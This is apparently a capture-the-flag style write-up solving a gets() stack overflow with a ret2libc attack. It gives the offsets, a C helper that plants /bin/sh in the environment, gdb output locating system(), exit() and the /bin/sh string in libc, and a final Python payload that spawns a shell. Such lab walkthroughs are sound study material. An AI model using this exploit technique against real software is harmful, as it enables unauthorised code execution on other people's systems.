<h3> Brief code overview</h3>

```
main() calls getpath()

which declares:
buffer[64]
ret;

then asks for intput.  gets(buffer) which is the input

ret = __builtin_return_address(0);
```


`__builtin_return_address(0)` gets the address of the current function.

current getpath() address `08048484`

After reading [shellblade.net/docs/ret2libc.pdf](shellblade.net/docs/ret2libc.pdf) which describes ret2libc attacks I made great progress!  

<h3>Finding the saved $EBP overwrite</h3>
I figured out how to overwrite the `RET` address.  The buffer was 64 chars, but to overwrite past it required 80 bytes. I passed the required 80 bytes to overwrite the buffer. Then 4 more to overwrite $EBP and 4 more to overwrite RET. The following below (after converting `FFFF` to `\xFF\xFF\xFF\xFF`) printed out the `bzzzt` within the `IF` statement indicating I was doing it right.  

```
buf="A"*64+"BBBB"+"CCCC"+"DDDD"+"EEEE"+"\xFF\xFF\xFF\xFF"
payload=""

print buf+payload
```

<h3> Shell try 1</h3>
Time to continue on and try and pop a shell!

After continuing reading through the shellblade ret2libc I decided to copy their C program that sets an environment variable `EGG` to `/bin/sh`, then on re-running the program prints the estimated address of this environment variable, which we will overwrite RET with.


```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
        char *ptr = getenv("EGG");
        if (ptr !=NULL)
        {
                printf("address:%p\n", ptr);
                return 0;
        }
        printf("set EGG\n");
        setenv("EGG", "/bin/sh", 1);
        execl("/bin/sh", (char *)NULL);
}
```

After running it twice the estimated address is `0xbffffa0f`

Next was not to just blindly paste this as at the end of our payload, but to actually find the correct address of `system()` and `exit`, and our environment variable.

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

(gdb) x4/s 0xbffffa0f
<removed. EGG=/bin/sh  WASNT THERE. Print out more!>

(gdb) x80/s 0xbffffa0f
<removed>
0xbfffff7c:	 "SHELL=/bin/sh"
<removed>
```
**important note:** the address of `SHELL="/bin/sh"` is `0xbfffff7c`, but `/bin/sh` is what we want, so because `SHELL=` is 5 bytes we add 5 bytes, getting `0xbfffff81`.

Since bzzzzt is printing `\xFF\xFF\xFF\xFF` this is where the payload needs to start. This value needs to be replaced with the memory address of `system`, followed by address of `end` and then finally our payload, the memory address of the string `/bin/sh`. There are 2 ways to get this value, one is using an environment variable (which I tried, but did get to work. which is the `0xbfffff7c` above). The other is to find `/bin/sh` inside of libc.  

<h3>Shell try 2</h3> 
<h4>Finding /bin/sh in libc</h4>
`info proc map` to find where /lib/lib2c is located in memory

Result:
`0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so`

use find to attempt to find the `/bin/sh` string from this address onward.
`find 0xb7e97000, +999999999, "/bin/sh"`


Result:

`Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
(gdb) find 0xb7e97000, +99999999, "/bin/sh"
0xb7fba23f`


`strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"`

result =`11f3bf /bin/sh`

go back to gdb, and verify `/bin/sh` is actually here.  This is actually the offset from 0xb7e97000 (how far into libc /bin/sh appears).

`x/s 0xb7e97000+0x11f3bf `
Result:
`0xb7fb63bf:	 "/bin/sh"`



<h4>Solution (Putting it all together)</h4>

So now we know `"/bin/sh"` is at `0xb7fb63bf` we can simply change our previously incorrect value of `0xbfffff81` to `0xb7fb63bf` and see if it works.

Success!!

```
buf="A"*64+"BBBB"+"CCCC"+"DDDD"+"EEEE"#+"\xFF\xFF\xFF\xFF"

payload="\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xbf\x63\xfb\xb7"#+"\x81\xff\xff\xbf"


print buf+payload
```


